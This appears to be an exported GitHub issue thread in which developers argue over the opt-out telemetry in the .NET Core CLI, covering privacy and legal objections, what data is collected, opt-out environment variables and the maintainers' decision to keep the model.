As an aside, it's been a busy week with shipping RC2 and answering questions. I haven't actually looked at this data yet and I'm one of the primary consumers. I'll be doing that today or tomorrow. I'm looking forward to sharing my insights.
"
2042	"@richlander

> we need both feedback and usage data

Does the telemetry still include arguments provided to the `dotnet` command? In server hosting scenarios, some may have sensitive arguments passed to the command (for portable apps) that they wouldn't want leaked to MS.

> and will transparently do what it takes

The program is not ""transparent"" IMO.
"
2043	"> Does the telemetry still include arguments provided to the  `dotnet`  command?

My understanding is that this was recently discussed with our privacy team and we concluded that collecting the arguments themselves (hashed or not) is not acceptable per our privacy policies. Not sure whether the code already reflects that, but it's being worked on.
"
2044	"> The program is not ""transparent"" IMO.

What would you accept as sufficiently transparent? Not trying to say that we already are sufficiently transparent; I'm trying to understand your concern and what we could do make it better. The product is worked on by various teams who all contribute to the same open source code base on GitHub. Clearly you think that's not sufficient, so I'd like to understand what process would address that.
"
2045	"@terrajobst Ah! Thanks. I'm glad the arguments are safe on the server.

WRT transparency: There is no indication at the time of install that the `dotnet cli` is automatically opted-into data sharing. There's no checkbox that will set the opt-out env var. There's no note or link to the GH issue or a Docs page that describes the program and how to opt-out. The privacy policy merely links to the generic MS privacy policy, where there is no mention of the program.

You really have to have heard about this through the GH issues or via chat at JabbR or Slack ... or Wireshark your server I guess. In my mind, that hardly constitutes ""transparency.""

IMO there is a great risk here for negative PR if the mainstream media gets a hold of this issue that will **not** be good. It's only a matter of time before some enterprising journalist looking for a scoop picks up on this. The headlines here are not good: **""Microsoft caught with sneaky program to spy on companies""** ... I know ... I know ... barely accurate given what the data is, how it's shared, and it's use by the teams. You know that doesn't matter one bit when you're trying to sell a newspaper. I was a college newspaper editor. Trust me ... it will **not** be good if the current disclosures about this program hold to RTM.
"
2046	"@GuardRex This is good feedback. We do have a bit more to do to make sure that everything to with telemetry is obvious. We'll make sure that gets into the next release.
"
2047	"GuardRex is exactly right about the lack of transparency and danger you are in for a shitstorm, so it is a good idea to include a checkbox in the installer to make it visible!

Also, you should keep in mind the problem is both privacy AND security. As for security, I think that MS forget that a power user/developer may have hundreds of pieces of software installed. If all these pieces of software (in a stealthy way) report usage back to various servers on the internet, then the security attack surface becomes so large that it is impossible to secure the computer. Hence, many companies will ban your software (especially on Linux servers).

This particular ""feature"" may undo all the good things that MS is doing with .NET core. Even if I might personally be persuaded to risk my computer and privacy, some of my customers won't. Hence, I will be reluctant to base my development on .NET core because of the customer reaction to spying.
"
2048	"I would probably agree that people will be a little miffed by this. Homebrew for OS X [recently went through this](https://news.ycombinator.com/item?id=11566720) even though they were well intentioned, did it anonymously, and provided a way to opt out.

I think simply asking people on first use if they'd like to submit telemetry is a good start.

Consider what Yeoman does on first use:

![screen shot 2016-05-19 at 10 26 05 am](https://cloud.githubusercontent.com/assets/361677/15396939/3b97f800-1dac-11e6-96a8-c2325b004faf.png)

I think people are generally happy to give feedback when asked.
"
2049	"@blackdwarf 
@piotrpMSFT 
@richlander
In related news, VS2015 just got into big trouble because spy code was discovered:
https://www.reddit.com/r/cpp/comments/4ibauu/visual_studio_adding_telemetry_function_calls_to/d30dmvu

You should consider learning from such mistakes!
"
2050	"Looks like issue #3404 is tracking implementing notification of telemetry.
"
2051	"@richlander - as someone looking to deploy projects built with this is healthcare and classified environments, this creates significant challenges. An environment variable is a decent starting point, but build time and local options should also be given to ensure that this data is not collected. I appreciate the desire of you guys, but it introduces security concerns. 
"
2052	"@GuardRex https://blogs.msdn.microsoft.com/dotnet/2016/06/27/announcing-net-core-1-0/#user-content-net-core-tools-telemetry shows the data points that are collected and the following statement which should make it pretty clear that telemetry only applies to the tools/CLI (i.e. `dotnet`):

> The feature will not collect any personal data, such as usernames or emails. It will not scan your code and not extract any project-level data that can be considered sensitive, such as name, repo or author (if you set those in your project.json). We want to know how the tools are used, not what you are using the tools to build. If you find sensitive data being collected, that’s a bug. Please file an issue and it will be fixed.
"
2053	"> only applies to the tools/CLI (i.e. dotnet)

If you mean it only applies to executing a portable app using `dotnet` (`dotnet .\myapp.dll`) and not a self-contained app using `corehost` (`myapp.exe`) ... I don't think the language states that clearly. One has to know that you don't consider `corehost` to be a ""tool,"" and that's not an assumption that I would make.

There is an on-going problem in assuming too much prior knowledge in communication with people (outside of the ASP.NET docs, where a major effort has been made to address this problem). I think writing docs with greater attention to explicit and comprehensive explanations, as annoying and time-consuming as that may be, clears up a great deal of confusion.

Setting this minor confusion aside, I greatly appreciate the effort that has been made to inform everyone about the telemetry program. I still wish that production servers weren't automatically opted-into the program, mostly because (just like @blackdwarf commented in a recent video interview I saw) I **hate** having to set and maintain env vars on servers ... a total PITA IMO.
"
2054	"Guys, this issue is really important. A lot of projects ask for telemetry and it is ok. In fact for a bunch of those like yo, bower and so on dev like me willingly opt in.  
But not asking using if he even want and referring to some elua that really no one will read smells. It is horrible  negative PR.  
Make option to opt in for use. Explain in details what you are going to collect and what not. Do not do it by default.  
Otherwise we really will have to block feature or not use dotnet entirely. I really don't think that paranoid security team will even allow devs to deploy this now.
"
2055	"Discovering this telemetry has put the plans I had in using .NET Core back on the drawing board. You are essentially refusing to accept an arms-length relationship by including telemetry. Data leakage is a risk even if it isn't user specific. It also creates attack opportunities since attackers now have this plentiful and predictable avenue of communication to go after. Not to mention that once marketing gets wind (if they didn't help drive it in the first place), the data collection will be expanded. Save yourself work by creating more admin/security work for your users (to opt out or block telemetry). Just because it's an industry trend doesn't mean its a good thing to do. </3
"
2056	"@kspeakman On the bright side, it is well controlled by the env var ...

https://github.com/dotnet/cli/blob/rel/1.0.0/src/dotnet/Telemetry.cs#L39-L44

... so at least if you add that via `web.config`, PowerShell, manually, or whatever ... it  disables telemetry effectively. However, if you were more generally concerned about `Microsoft.ApplicationInsights` being on the server _at all_, then they have said that `corehost` doesn't have telemetry built-in, so you could go the self-contained app direction (no shared framework on the server) and avoid this entire issue. The only catch is that you need to pull the ASP.NET Core Module out and install that manually ... they don't have a standalone installer for the module yet (AFAIK), nor has it been spun off into OSS yet (but they are planning to do that).
"
2057	"Is there any chance that this telemetry ""feature"" will be removed from the next version of the tools?
If not, I totally agree with the original poster, this should be opt-in, not opt-out.
"
2058	"At the very least, the dotnet program should ask on first run whether the user wants this or not.

First Windows 10 and now this.

I don't want telemetry. At all. It's fine when people are beta testing a product in a special testing environment, but not in production.
"
2059	"This really needs to be opt in, I haven't been playing since beta 8. Got caught up this evening with some of the community standups and decided to have a go with the latest. Spent ages reading the privacy policy & community response and not clicking the agree button.

Yes it's easy to opt out, that's great but these sorts of things occurring make me just want to go hack on some python in emacs instead.

Help the community to trust the mega corp vendor, surely that's one of the aims of going open source?
"
2060	"Making this opt-out instead of opt-in seems like really poor judgement. I understand and respect the need for you to collect some usage to help guide the .NET Core platform, but printing a few lines of text once before starting to send unspecified data over the 'net to some server is just disrespectful.

Please make it opt-in or remove it entirely.
"
2061	"I vote to remove it fully from .Net Core source code.
It must be an external option, user should have ability to download some package to start statistics collection.
"
2062	"Since there hasn't been any post on this topic in a couple of months, I will share some insights having just come across this as a fresh (potential) adopter of Core CLR.

Just downloaded latest build of .NET core and just by luck noticed the unremarkable disclaimer after running one of the dotnet shell commands.

This is altogether ridiculous and comes on the heels of already-rediculous telemetry collection in their other products. I feel like Microsoft is saying publicly that they're not tone def to the community then they keep doing things like this.

I was starting to get excited about the implications of Core CLR and what that could mean for the expansion of C# (the language itself is really fantastic).

This automatic telemetry nonsense is a big reason why I shy away from the Windows platform entirely. It's not even about my own personal feelings or beliefs on privacy concerns and whatnot. It's about selling this platform to my company and my contracts. In an enterprise environment, getting people to trust Microsoft is already an uphill battle with many with my fellow developers and higher-ups. Making the case for using C# + Core CLR on Linux is MUCH easier than making the case for switching entirely to Windows.

However, this telemetry nonsense is simply a nonstarter. Imagine trying to sell this to someone already averse to monoliths and vendor lock-in (synonymous in our field with MS, for better or worse) then immediately having to defend telemetry collections (and the disablement thereof). We run production workloads in production data centers with enough infosec headaches already. Things like this are simply nonstarters for many executives. Sure, we can add an environment flag, but when has someone EVER forgotten to do that?

Alas, I am beginning to feel that Core CLR will go the way of Windows 10: admittedly great technology crippled by corporate nonsense that makes many developers just go look for some alternative when choosing a tech stack that doesn't come laden with such nonsense.

TL;DR; turn this crap off. You're pissing off the people you claim to be building tools for."
2063	How about checking `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\DataCollection\AllowTelemetry` and disabling telemetry when it exists and is `0` in addition to your product specific opt-out? Users who don't want Windows telemetry almost certainly don't want .NET telemetry either.
2064	"@CodesInChaos, .Net Core can run on Linux... 
And I personally think some flag wherever is bad idea... as well as any assumptions... 
User should be able to control all in obvious way.
"
2065	"@hardhub 

>in addition to your product specific opt-out

CodesInChaos is suggesting that if the platform is Windows and they opted out of Windows telemetry, then just assume ""no"" telemetry. Otherwise, allow the user to make a selection.

"
2066	"@vcsjones 

I see... And I mentioned what Linux guys should do? And no Windows Enterprise 10 users?
I think some registry key somewhere is not good idea for user privacy... not enough obvious.
It should be available very easy and disabled by default... I personally suggested to enable telemetry as package. Google, for example, does not force us to use GA...."
2067	"In the interests of transparency, please let us all know which hostnames/servers to which the data is sent.

This will also allow people to block this traffic once, at the network level, instead of having to update every RC file for every shell for every user for every machine."
2068	"@OpinionatedGeek 

>In the interests of transparency, please let us all know which hostnames/servers to which the data is sent.

Telemetry is collected using Application Insights, to my knowledge. The documentation for their endpoints and IPs is here: https://docs.microsoft.com/en-us/azure/application-insights/app-insights-ip-addresses"
2069	"@vcsjones Many thanks for that link and those hostnames. It's a very handy reference!

Can anyone from Microsoft confirm or deny that this is the full, correct list? I note that blocking all the listed hostnames would mean blocking access to hosts like login.windows.net and packages.nuget.org - hosts Microsoft probably doesn't want blocked.

Many thanks.

"
2070	"The ones specifically for telemetry are dc.services.visualstudio.com and dc.applicationinsights.microsoft.com. The rest are for ApplicationInsights, but aren't categorized as Telemetry.

Keep in mind this would affect any application that uses Application Insights, not just the SDK."
2071	"I'd still like to hear from Microsoft the official list of servers to which the telemetry is sent. Can someone from Microsoft please reply with these details?

The telemetry hostnames aren't in the dotnet CLI code base as far as I can tell, and I don't want to just assume that the hosts are the same as the 'Azure Application Insights' hosts, or that they remain the same across all OSs."
2072	"I also agree, telemetry should be an option activated only after the user's explicit authorisation or through: `export DOTNET_CLI_TELEMETRY_OPTIN=1`.
"
2073	So it's been months. Nothing from MSFT. Clearly avoiding the discussion...
2074	"@chrisjsmith 

Each company pursues its selfish interests ...

Hey MS! Tons of bugs is not what open source world means... 
It means to be open and ready to collaborate with people.
"
2075	"I thought to better frame this discussion it might be worth while to explore *what* telemetry is collected. I did my best to capture this, and have probably gotten some of this wrong.

1. The *name* of the command that is run, like `dotnet *foo*`. https://github.com/dotnet/cli/blob/58c580dbcc212846d38820d015e73f2d7e80214e/src/dotnet/Program.cs#L148. It does not appear to collect the arguments passed to the command.

1. When installation is complete successfully. It appears to also collect the name of the exe files that did the installation. https://github.com/dotnet/cli/blob/5a37290f24aba5d35f3f958300aa20329e5ccaa7/src/dotnet/commands/dotnet-internal-reportinstallsuccess/InternalReportinstallsuccessCommand.cs#L33

1. Any telemetry logged by MSbuild. This is done by creating a [logger](https://github.com/dotnet/cli/blob/3471d437969ed52d12116f7067b02e6e12a49d03/src/dotnet/commands/dotnet-msbuild/MSBuildLogger.cs) and handling only telemetry events from MSBuild. This is a rather complicated subject in MSBuild and wasn't very easy for me to follow, so if there are concerns of interest in MSBuild telemetry, perhaps the issue is best raised there.

1. Detailed information about `dotnet new`. However, none of this appears to contain personal information. It is mostly the template and language that is used in `dotnet new`, or if you used the help parameter.  https://github.com/dotnet/templating/blob/rel/vs2017/3-Preview3/src/Microsoft.TemplateEngine.Cli/New3Command.cs#L916"
2076	"@vcsjones 

Thanks for information...
But it does not matter... which exactly info is collected. It matters only for user which accepts it!
We just said that anybody should have a CHOICE to enable it or never enable it.
Let's say it is something like GA added to your app.. You know that Google can collect some big data... But you accept this... it is your choice.. you ADDED it yourself because it seems OK for you to share this info with Google to get good stats. But with this telemetry we have to find a way to avoid an imposed ""features"". It is abnormal even if MS wants to do its best."
2077	"Folks ... good peeps ... plz ... just set the env var ...
```
DOTNET_CLI_TELEMETRY_OPTOUT
```
... and take a look at ...

https://github.com/dotnet/cli/blob/5a37290f24aba5d35f3f958300aa20329e5ccaa7/src/dotnet/Telemetry.cs#L42

You're good after that. The problem early on was simply that it wasn't clear if/when/what was being collected and exactly how to get out of telemetry. Now, they make it super clear that if you just set the var you're NOT tracked. It's also spelled out now what is being collected: https://docs.microsoft.com/dotnet/core/tools/telemetry"
2078	"That's misspelled. It should be OPTIN.

Rationale for this being a bad idea:

1. This defines the set of data currently collected. If this changes, it may collect more data. That means to ensure that it doesn't leak data, you have to audit every release to ensure telemetry hasn't changed.
2. There's no test case.
3. It, as most MSFT products these days, shows absolutely no respect for the end user's preferences.
4. EU Article 29 Working Party are still miffed about the opt-out Windows 10 telemetry. Adding it to your development tool chain is just throwing gas on the fire.

There's enough case to change this to opt in. This is met with silence which is unacceptable. It's like the MS Connect issue I opened against IE9 after they broke ClickOnce when the new download bar turned up. Suck it up and accept it and when you provide evidence, silence. 

Go doesn't call home.

Python doesn't call home.

Vim doesn't call home.

Hang on I think I just solved the problem..."
2079	"It's not misspelled. One must opt-out by setting a value of true or 1 (""yes"" used to work, too) ...

https://github.com/dotnet/cli/blob/5a37290f24aba5d35f3f958300aa20329e5ccaa7/src/dotnet/Telemetry.cs#L26

[edit] I think what ur referring to was an earlier post where the comment was that it *should be* opt-in."
2080	"So much for being facetious.

""yes used to work too"" is an indicator of how broken it is. Does it work now? Where's that test case?"
2081	Thx @benaadams ... we need to update the topic. I'll take care of it.
2082	"The telemetry data is being shared now; and you can also download it:

> ### [What we’ve learned from .NET Core SDK Telemetry](https://blogs.msdn.microsoft.com/dotnet/2017/07/21/what-weve-learned-from-net-core-sdk-telemetry/)
> We are releasing .NET Core SDK usage data that has been collected by the .NET Core CLI. We have been using this data to determine the most common CLI scenarios, the distribution of operating systems and to answer other questions we’ve had, as described below.
>
> As an open source application platform that collects usage data via an SDK, it is important that all developers that work on the project have access to usage data in order to fully participate in and understand design choices and propose product changes. This is now the case with .NET Core.
>
> .NET Core telemetry was first announced in the .NET Core 1.0 RC2 and .NET Core 1.0 RTW blog announcements. It is also documented in .NET Core telemetry docs.
>
> We will release new data on a quarterly schedule going forward. The data is licensed with the Open Data Commons Attribution License.
>
> ...

And much more info at the blog post  https://blogs.msdn.microsoft.com/dotnet/2017/07/21/what-weve-learned-from-net-core-sdk-telemetry/"
2083	"I think MSFT is missing the point here. Opt out data collection is not welcome regardless of the outcome or data being collected. It may even be illegal in some jurisdictions. EU are about to explain this to you by the looks. Choice is what matters and respect for the end users which is not being displayed here. 

This is indicated by the fact that every time telemetry is mentioned with any product that MSFT ships a very slightly different question is being answered. For example this thread clearly states that people want it removed and we're being responded to with ""here's what we collected, it's not so bad"". Same with windows 10 telemetry where the silence is deafening. Is it the party line inside MSFT to not answer the same questions and drown them out with marketing and blog posts?

On top of this it's quite difficult getting this past security controls in some corporates. If your product calls home by default you're off then tender list immediately. There is not even any discussion on the matter. 

Transparency is not showing us what you collect, it is explicitly asking to collect it. You're running the ""hey we're collecting data, jump through these hoops in every workstation, deployment environment and target to turn it off"" model which isn't sometime most people will want. It also sets a new precedent which I at least am not entertaining.  

"
2084	"FWIW @chrisjsmith I agree with you.

Given the utter lack of response to questions in this Issue, it might be worthwhile putting thoughtful remarks like these in a comment to [the blog post](https://blogs.msdn.microsoft.com/dotnet/2017/07/21/what-weve-learned-from-net-core-sdk-telemetry/). I commented and at least I got a response there."
2085	"@OpinionatedGeek @chrisjsmith I'm working on the topic updates as you can see on https://github.com/dotnet/docs/pull/2706. Unfortunately, the review site, which would show a built version of the topic after the CI runs, doesn't work publicly. However, you can see the proposed updates if you look at the diff that seek to address the transparency concerns. I'm working through these updates with the following in mind: who, what, when, where, how, and why. If I haven't hit the sweet spot, I think I'm getting pretty darn close.

I think the 1st draft is just about done now. I'm going let that build this afternoon (takes 4-5 hours) and then take a final look. If you want to wait a little longer for my final checks, then just wait until I pull the **WIP** off of it, which I plan to do by the end of the day (Saturday, 7/22).

I invite you and everyone to take a look and provide feedback. Of course, the docs issue and PR only pertain to the coverage of the feature ... nothing about the presence of the feature itself should be discussed over there. This issue is the best place (or the blog post comments as you say) to discuss the presence of the feature or how it works.

To discuss language used in the PR, use the PR comments or attach comments directly to the lines of the diff. To discuss the coverage of the telemetry feature generally, please use the attached issue at: https://github.com/dotnet/docs/issues/2705.

Keep in mind that the updates are only a 1st draft subject to heavy revision and approval. What comes out of this process may even go as far as only making superficial changes to the current topic or a complete rejection of the PR itself. Just keep that in mind."
2086	">Given the utter lack of response to questions in this Issue, it might be worthwhile putting thoughtful remarks like these in a comment to the blog post. I commented and at least I got a response there.

Maybe we have to put url to this topic there? ))"
2087	"While I agree with the sentiment here, if you look at Windows 10 logging, even when turned off by group policy it is sending data back to Microsoft. They clearly want to be gathering data in troves at a corporate level. I don't seeing this ""feature"" going away. "
2088	"> Maybe we have to put url to this topic there? ))

I already did @hardhub - here's the paragraph where I mention it:

> Despite someone’s Github issue – https://github.com/dotnet/cli/issues/3093 – (over a year old and still running), despite someone else’s Pull Request – https://github.com/dotnet/cli/pull/7096 – switching telemetry off by default, we are in the situation where Microsoft now seems intent on making the tool’s spying even worse, all while talking about community engagement.

By all means add it again, if you believe it'll help."
2089	"After more than 1 year, I guess this discussion is running in circles when there are only two obvious decisions to be made:

1 - Yes, we agree with the concerns raised here and will change the Telemetry to be OFF by default as proposed on #7098.
2 - No, we want the data and will not ask permission before enabling telemetry. This software is free and if you want to use it read the instructions and disable the telemetry yourself. Or don't use it at all.

Any other discussion on sharing what's collected, better explanations and showing the benefits are just PR damage control for deciding option 2, which we all know some people won't like.

Just give us a plain NO and we won't bother raising concerns like this again."
2090	Just throwing this in here: A trending HN article from a few hours ago [https://news.ycombinator.com/item?id=14836737](https://news.ycombinator.com/item?id=14836737) .
2091	I was just about to add that :)
2092	"@rafaelrpinto 

I think Microsoft's position has been a pretty clear NO. For example, the second post in this thread by @richlander says:

> we need […] usage data in order to help us find all of the rough edges

> The telemetry feature is configurable, so you can turn it on/off at any time. It is also scoped, only applying to tools usage, not the rest of the product. We think that this is a good trade-off and recognize that not everyone will like it."
2093	"@svick 
I don't see it that way, on the contrary, I believe that was just the beginning of the discussion. Since the initial post the matter evolved to the current suggestion of an opt in approach which hasn't been formally ruled out so far.

Besides that the issue is still open, which make me believe there is still room for discussion."
2094	"> we need […] usage data in order to help us find all of the rough edges

```
Thank you for installing dotnet core.
Your usage can give us insight to rough edges where we need to make improvements.
If you are willing please hit Y to enable telemetry you can read more about it at {{url}}.

Otherwise hit any key to continue without telemtry

>
```

It's not Microsoft want telemetry that's the problem, I'm sure many people would be happy to share, it's the way it's being done."
2095	"See my recent post -> [What we’ve learned from .NET Core SDK Telemetry](https://blogs.msdn.microsoft.com/dotnet/2017/07/21/what-weve-learned-from-net-core-sdk-telemetry/). I see it is linked above, too.

I would be happy to entertain more opt-out options along the lines of https://github.com/dotnet/cli/issues/6086. I'm going to focus on that. The current model of telemetry is very useful given the usefulness of the data that it produces (as discussed in the blog post). It is very important for our future development that we continue to have access to the data.

I'm closing this issue. We've heard that feedback and are choosing to continue with the same model. I know that's a disappointment to the folks on the thread (and others). We're focussed on building a great application platform and are choosing to make usage data a very key part of that effort.

Full disclosure: #7283 "
2096	Thanks for all the fish.
2097	And thus ends 15 years of .Net and C# for me.
2098	"Microsoft has talked a lot about its commitment to 'community' with open-source dotnet, but the truth seems apparent now: the community didn't ask for this change, this Issue shows many in the community don't want this change, and Microsoft say they're going to ignore that and do as they please.

I'm not so much disappointed in the decision as in Microsoft itself. I did think they'd changed when they open-sourced .Net and were honestly going to be community-driven. Apparently not."
2099	Talk about community and commitment merely appears to be cheap marketing. Did we expect more? Really, the only motivation to open source .Net, move SQL Server to Linux and introduce WSL is to confuse the lines between disparate platforms to leverage sales of a subscription model.  I was just hoping to take something away from this which I have invested years of my life in; clearly not. Alas that's a discussion for HN rather than here so I'm going to leave it at that.
2100	"> And thus ends 15 years of .Net and C# for me.

Maybe it is time to think about fork?
I thought about Java but it is not an alternative as well...
So we can just remove telemetry and create alternative distribution.. what do you think?
"
2101	"I was getting interested on this Microsoft movement to Linux and open source, but now it's clear how things will ever be around here.

@hardhub 
Between Scala, Node.js or Go there is certainly an alternative for what you need. The only thing .NET does better than all these other platforms is to collect telemetry =]

Cheers,"
2102	"@rafaelrpinto 

Sorry bro but no...

Scala is totally Java dependent.. So why do we need Scala if we cannot accept Java?
If can accept Java then Java is very good alternative for .Net.

Node.js is absolutely not alternative... due to JavaScript, performance and absence of multithreading.

Go? Why not Rust then? Rust is C-like and designed to be amazing fast. But I think both have small popularity in community. So they have much less frameworks, community support and so on...
"
2103	"@hardhub 
JavaScript performance and absence of multi-threading?

Good luck with .NET bro. It's the right platform for you."
2104	"> @richlander: I'm closing this issue. We've heard that feedback and are choosing to continue with the same model.

I would like to point out, that, without informed, prior consent, collecting **any** personal information is illegal in most jurisdictions. There is sufficient precedent in the EU data protection directives 1995/46/EC, now superseded by [2016/679/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32016R0679), as well as similar legislation in the state of New York (not sure which one at the moment) that collection of any data amounts to collection of personally identifiable information, as the time the data is collected and the information about where on the internet it is sent from can often, though sometimes inaccurately, identify a person, and is often treated as such information.
The only way you can comply with the legislation is to ensure every user of your software is prompted and asked for consent (which you cannot reliably do, as computers may be in shared use in a manner that should be obvious to you) or to make telemetry collection an opt-in setting as specified in pulls #7096 and #7098 .
Yes, I understand this means you will most likely not get any or poor telemetry results. You are going to have to live with that, or stop distributing your software in the aforementioned markets. Blocking telemetry requests on a geoIP basis on your servers does not meet the requirement.
Feel free to contact the legal department. You may be liable for damages."
2105	This telemetry prompts are so badly implemented that they break the package installation on debian/ubuntu cp. #7420 
2106	"This demonstrates my point about testing above as well. 

If MSFT don't back down then it's clear the community doesn't matter."
2107	"That there even is a discussion about default opt-out is ridicule- and I'm pretty sure that the way telemetry is handled now (on by default) is illegal within the EU. Like some people already pointed out- this should be off by default, and there should be a simple option (see Homebrew, Yo) to disable it and not dig for information within git issues, and...

How about you **telemeter** this facts and stop spin-doctoring around angry users comments, and **do** something and not try to justify something (that your employee might enforce)

If I wouldn't read that small opt-out word after installation on macOS I wouldn't even know that you have and will gather any data at all, I can't say that this is obvious and well communicated fact - or is it? Really, I thought that MS Steve 'Monkey-boy' Ballmer era is gone and 2 words OSS and MS won't auto-generate jokes around the dev's table - but here I am again, feeling like it's 2001."
2108	"Just read the telemetry page on dotnet, following the thought process there (and here to a extent), 
I hope that every Linux distribution will automatically set **DOTNET_CLI_TELEMETRY_OPTOUT=1** environment variable  system-wide within /etc "
2109	"Btw. your installation script is sending telemetry - before displaying any information about the same step and **not** as you claim [here](https://docs.microsoft.com/en-us/dotnet/core/tools/telemetry) since your installer launches the `dotnet` command itself and the **very first thing** it does, guess what? It phones home with **telemetery** (and /dev/nulling the thing itself)! For real?

pkginstaller cmd:

`dotnet exec $INSTALL_DESTINATION/sdk/2.0.0/dotnet.dll internal-reportinstallsuccess ""$1"" > /dev/null`

launching the same command from term without passing $1

```
System.InvalidOperationException: Sequence contains no elements
   at System.Linq.Enumerable.Single[TSource](IEnumerable`1 source)
   at Microsoft.DotNet.Cli.InternalReportinstallsuccess.ProcessInputAndSendTelemetry(String[] args, ITelemetry telemetry)
   at Microsoft.DotNet.Cli.InternalReportinstallsuccess.Run(String[] args)
   at Microsoft.DotNet.Cli.Program.ProcessArgs(String[] args, ITelemetry telemetryClient)
   at Microsoft.DotNet.Cli.Program.Main(String[] args)
```

Uhmm... ok."
2110	"> I hope that every Linux distribution will automatically set DOTNET_CLI_TELEMETRY_OPTOUT=1 environment variable system-wide

@jankun I've raised an issue about this for my Linux distro (Linux Mint): https://bugs.launchpad.net/linuxmint/+bug/1720110 and I hope others do the same"
2111	"Good idea.

More deafening silence from MSFT even though the telemetry is flawed as outlined by @jankun "
2112	"@chrisjsmith @jankun 
I know this issue is closed but it's quite an interesting topic so just wanted to leave some feedback.
I agree that there should be a checkbox on the installer. 
The only reason not to have a checkbox on the installer (or any other kind of Yes/no experience), is because **_it makes it too easy_** for users to express a desire to opt out. **You want to make this difficult**, right?. Even if its a small step to go and set an environment variable - 'it's still a step!'. This will mean you still get the data for the portion of people who are too lazy or simply forget to follow up and set that environment variable. That's _more data for you_.

Also we are trained these days to bypass lots of boring text, and look for the things that we need to engage with on forms. When running through an installer - does anyone actually read the end user licence agreement in it's entirety? Ofcourse not! We have been trained to scan for the UI elements that actually require engagement of some kind. So:

 - A bit of text explaining some stuff about telemetry - meh - not important - you can't change this text or have any impact on it right now.
 - A checkbox confirming whether I want telemetry enabled? Ok thats actually engaging me with a question. I'll respond.

Microsoft don't want to truly engage you with this question - they need this data. This data makes the product better. That means _they don't really want you to have a choice_.

It's a shame because when users are given a choice, and they do **choose** to help improve a product - you garner loyalty from that user at the same time. The user, feels like they chose to help the product and this in turn makes them feel valued - **which builds trust, and loyalty**. The question may as well ask ""Do you trust me?"". Microsoft are too scared to ask such a question - they would rather you didn't even think about this question - just focus on the goodies that come in each new release.

Can we blame them? Well we can stop using their product. Thing is `dotnet core` is absolutely fantastic and this isn't a sacrifice I am willing to make for the sake of what is actually being collected. It's a trade off. I am forced to accept a seemingly underhanded way of collecting data just because the platform _is something I want to use._. Their licence is pretty clear on the topic:

> License
The Microsoft distribution of .NET Core is licensed with the MICROSOFT .NET LIBRARY EULA. This license includes the ""DATA"" section to enable telemetry (shown below).
.NET NuGet packages use the same license but don't enable telemetry (see Scope).
DATA. The software may collect information about you and your use of the software, and send that to Microsoft. Microsoft may use this information to improve our products and services. You can learn more about data collection and use in the help documentation and the privacy statement at http://go.microsoft.com/fwlink/?LinkId=528096. Your use of the software operates as your consent to these practices.

Given that the installer records telemetry on install though - it's arguable whether you can ""use the software"" (and thus consent to telemetry) before it's actually installed. So sending telemetry on install seems a bit shady - depending on whether that classes as actually having used the software yet.. I imagine that ""use"" the software means as soon as you launch the installer, not as soon as you run your first `dotnet cli` command. In which case, the installer can send whatever telemetry home it likes, before you are even aware of it, let alone before you decide to disable it.

"
2113	"It's very shady and the reason it's shady is because no one gives a crap if they get their data, thus proving again that the customer, even if paying like my good self, comes second.

The problem is not that there should be a check box in the installer. It is that the default assumption should benefit the user before the vendor, particularly as this is supposed to be a _good citizen_ open source project. In this case, the telemetry should default to OFF to protect the user's privacy. It should ask to enable it. This applies particularly to the scenarios where it isn't deployed on top of windows and is instead deployed from package repositories on Linux distributions. If you look at the common ecosystems around Debian for example you will not find telemetry enabled by default anywhere. In fact you will see a very strong pro-privacy stance.

Personally, I really don't care if the data benefits Microsoft. It's whether or not the collection benefits me and it does not. There are far better ways to engage the customer and take feedback. Like not letting things sit on MS connect for 5 years unfixed, being able to coordinate between the dotnet and clickonce team on critical issues that crippled us for years, actively listening to customer requests on privacy rather than deafening silence while at the same time trying to drown everyone in blogs, marketing etc. Or perhaps fix some well recorded bugs where the start menu stops responding to the keyboard in Windows 10 that has been floating around for 2 years. None of these things get fixed with data; only customer engagement and not the lip service of blog posts, uservoice and other ridiculous abstractions to try and hide the incompetence.

This is merely a growing abusive relationship with a rather regressive, data-obsessed corporate America and I'm out. There are better options on the table.

If you want an illustration of how much data is being collected, install Fiddler on your PC and let it run for a couple of hours. I personally, and many of us, don't want this to be a de facto standard for software going forwards."
2114	"> This applies particularly to the scenarios where it isn't deployed on top of windows and is instead deployed from package repositories on Linux distributions.

To be fair, most Linux distributions compile software from source. If they were building .NET Core and packaging it, they could just disable telemetry by default. "
2115	"@omajid 

>To be fair, most Linux distributions compile software from source. If they were building .NET Core and packaging it, they could just disable telemetry by default.

I do not agree. Maybe RHEL will do that and maybe CentOS maintainers (in the future) will include own packages in their repositories (with telemetry disabled?).
In any case current official documentation from MS says the following about CentOS:

![image](https://user-images.githubusercontent.com/4306334/31084899-5a497b5c-a79e-11e7-9e2f-b1f8b0f24e41.png)

And obviously this package contains original version with telemetry.

There is same situation with Debian.. just look it here for more details:
https://www.microsoft.com/net/core#linuxcentos
https://www.microsoft.com/net/core#linuxdebian

"
2116	"> Maybe RHEL will do that and maybe CentOS maintainers (in the future) will include own packages in their repositories (with telemetry disabled?).

RHEL already does. I am working with CentOS folks to make that happen too (with telemetry disabled by default).

> And obviously this package contains original version with telemetry.

Yes, that is true. Sorry, I didn't mean to disagree with anyone here. I was speaking about a hypothetical future where .NET Core was built by and part of Linux distributions. I know that this is not the case right now and the packages published by Microsoft do not meet the packaging guidelines (including collection of user data) expected by many Linux distributions.

But *if* .NET Core was packaged into Debian (not just *for* Debian), it would have to comply with packaging standards that Debian uses. And so it probably would have been patched to not collect user information by default."
2117	"> RHEL already does. I am working with CentOS folks to make that happen too (with telemetry disabled by default).

That's great to hear! I hope it also happens for Debian and Ubuntu and all their derivatives."
2118	"> RHEL already does

Does it also disable the [telemetry during installation](https://github.com/dotnet/cli/issues/3093#issuecomment-326327218) that ~~is independent to~~ runs before the message about `DOTNET_CLI_TELEMETRY_OPTOUT`?

"
2119	"> Does it also disable the telemetry during installation that is independent to DOTNET_CLI_TELEMETRY_OPTOUT?

Telemetry is disabled in every situation, including installation if the `DOTNET_CLI_TELEMETRY_OPTOUT` flag is set, as in the source for the [Telemetry.cs](https://github.com/dotnet/cli/blob/22cd85daf6ca63a48e35fc7e278a7dba4d81dc6f/src/dotnet/Telemetry/Telemetry.cs#L32-L34) component"
2120	"> I was speaking about a hypothetical future where .NET Core was built by and part of Linux distributions. 

It is what I mentioned...  
